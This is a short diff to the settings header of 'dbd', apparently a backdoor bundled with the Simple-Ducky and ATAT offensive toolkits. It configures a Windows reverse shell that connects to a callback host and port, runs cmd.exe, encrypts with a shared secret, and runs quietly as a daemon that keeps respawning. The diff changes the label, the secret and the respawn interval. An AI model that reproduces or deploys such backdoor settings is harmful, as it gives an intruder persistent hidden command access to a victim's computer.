@@ -3,7 +3,7 @@
  * or type in your own. when finished, recompile dbd.
  */
 
-/* Simple-Ducky Windows Reverse Shell Settings*/
+/* ATAT Windows Reverse Shell Settings*/
 
 #define HOST "192.168.1.67"
 #define PORT 455
@@ -13,9 +13,9 @@
 #define EXECPROG "cmd.exe"
 #define CONVERT_TO_CRLF 0
 #define ENCRYPTION 1
-#define SHARED_SECRET "t00rt00r"
+#define SHARED_SECRET "testtest"
 #define RESPAWN_ENABLED 1
-#define RESPAWN_INTERVAL 1800
+#define RESPAWN_INTERVAL 600
 #define QUIET 1
 #define VERBOSE 0
 #define DAEMONIZE 1
